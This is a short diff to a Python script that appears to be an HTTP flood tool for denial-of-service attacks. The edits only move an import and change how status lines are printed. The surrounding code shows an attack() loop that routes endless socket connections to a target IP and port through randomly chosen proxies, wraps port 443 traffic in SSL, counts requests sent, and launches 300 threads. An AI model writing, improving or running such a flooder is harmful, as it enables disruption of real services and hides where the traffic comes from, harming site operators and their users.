@@ -1,5 +1,6 @@
 import random
 import socket
+import socks
 import threading
 import ssl
 import multiprocessing
@@ -7,7 +8,6 @@ import requests
 import sys
 import time
 import datetime
-import socks
 
 Choice = random.choice
 Intn = random.randint
@@ -119,8 +119,6 @@ def attack():
     header = rqheader()
     proxy = Choice(proxies).strip().split(":")
     go.wait()
-    LINE_UP = '\033[1A'
-    LINE_CLEAR = '\x1b[2K'
     while True:
         try:
             if rpath == True:
@@ -131,14 +129,13 @@ def attack():
             s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             s.connect((ip, port))
             num_sent = num_sent + 1
+            sys.stdout.write("[+] [Failed Request]: " + str(req_error) + " ["+ str(num_sent) + " SENT "+ str(proxy[0])+":"+str(proxy[1]) +"] => "+ip+":"+str(port)+path+"\r")
             if port == 443:
                 x = ssl.wrap_socket(s)
                 port443(x,request)
         except:
             req_error=req_error+1
-        print("[+] [Failed Request]: " + str(req_error) + " ["+ str(num_sent) + " SENT "+ str(proxy[0])+":"+str(proxy[1]) +"] => "+ip+":"+str(port)+path, end="\r")
-        print(LINE_CLEAR + LINE_UP,end=LINE_CLEAR)
-
+        sys.stdout.flush()
 
 def build_thread():
 	for _ in range(300):
